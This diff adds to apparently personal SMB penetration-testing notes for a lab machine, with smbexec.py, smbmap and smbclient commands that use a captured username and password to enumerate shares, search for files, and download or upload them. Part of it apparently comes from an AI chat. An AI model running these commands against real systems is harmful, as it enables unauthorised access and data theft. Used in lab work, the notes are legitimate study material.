@@ -41,6 +41,76 @@ Access to the IPC$ share can be obtained through an anonymous null session, allo
 
 
 
+
+Use Impacket for Enumeration: Impacket’s tools, like smbexec.py, wmiexec.py, or lookupsid.py, are often more versatile with SMB protocols:
+
+	smbexec.py administrator.htb/Olivia:ichliebedich@10.10.11.42
+
+
+Use Other Enumeration Tools:
+
+Smbmap is a versatile tool for enumerating SMB shares on a network. It allows you to identify accessible files and directories and check permissions for shares across multiple SMB-enabled systems. Here’s how you can use it to further enumerate shares and permissions on the target IP 10.10.11.42 with the credentials you have.
+
+Consider using tools like rpcclient, smbmap, or enum4linux for further exploration, which might reveal other accessible paths or directories:
+	
+	smbmap -H 10.10.11.42 -u Olivia -p ichliebedich
+
+1. Basic Enumeration of SMB Shares
+To list all available shares on the target, along with access permissions for the Olivia account, use:
+
+	smbmap -H 10.10.11.42 -u Olivia -p ichliebedich
+
+This command will show each share, indicate if you have read/write permissions, and help identify accessible directories.
+
+2. List Files and Directories in Specific Shares
+To dive deeper into a particular share (e.g., SYSVOL or NETLOGON), you can specify the -s option followed by the share name:
+
+	smbmap -H 10.10.11.42 -u Olivia -p ichliebedich -s SYSVOL
+This command will list files and directories in the SYSVOL share and show if they are readable or writable.
+
+3. Recursive Directory Listing
+To recursively list all files within a share, use the -r option. This is useful for finding hidden directories or sensitive files in deeper directories:
+
+	smbmap -H 10.10.11.42 -u Olivia -p ichliebedich -s SYSVOL -r
+
+Note: Recursive listing can be slow on large shares, so use it selectively.
+
+4. Download Specific Files
+If you identify a file you want to download, you can use the -A option with the filename (or a part of it). For example, to find and download Gpt.ini files, which are often found in Group Policy directories:
+
+	smbmap -H 10.10.11.42 -u Olivia -p ichliebedich -s SYSVOL -A Gpt.ini
+If a matching file is found, smbmap will offer an option to download it.
+
+5. Search for Specific File Types
+You can use smbmap to search for files of specific types (like .txt or .config) across all accessible directories:
+
+	smbmap -H 10.10.11.42 -u Olivia -p ichliebedich -A *.txt
+
+This helps in locating potentially sensitive information stored in plaintext files.
+
+6. Write Files to a Share (If You Have Write Access)
+If you have write permissions on a share, you can upload files to it. Use the -u and -p flags as usual, along with the -d option (destination directory) and -F option (file to upload). For example:
+
+	smbmap -H 10.10.11.42 -u Olivia -p ichliebedich -s <share_name> -d <directory> -F <file_to_upload>
+Note: This can be useful if you are testing write access, but ensure that you have permission to upload files as part of your assessment.
+
+Example Workflow
+List All Shares:
+	
+	smbmap -H 10.10.11.42 -u Olivia -p ichliebedich
+Explore SYSVOL Share:
+	
+	smbmap -H 10.10.11.42 -u Olivia -p ichliebedich -s SYSVOL
+Search for .ini Files Recursively:
+	
+	smbmap -H 10.10.11.42 -u Olivia -p ichliebedich -s SYSVOL -A *.ini
+Using smbmap in this way can give you a comprehensive view of accessible files and folders, which might reveal valuable information on the system’s structure and accessible resources. Let me know if you need further assistance with smbmap!
+
+
+
+
+
+
 SMB Environment Information
 Obtain Information
 
@@ -109,7 +179,8 @@ In file browser window (nautilus, thunar, etc)
 	
 List shared folders
 It is always recommended to look if you can access to anything, if you don't have credentials try using null credentials/guest user.
-
+	
+	smbclient -L //10.10.11.42 -U Olivia%ichliebedich
 
 	smbclient --no-pass -L //<IP> # Null user
 	smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
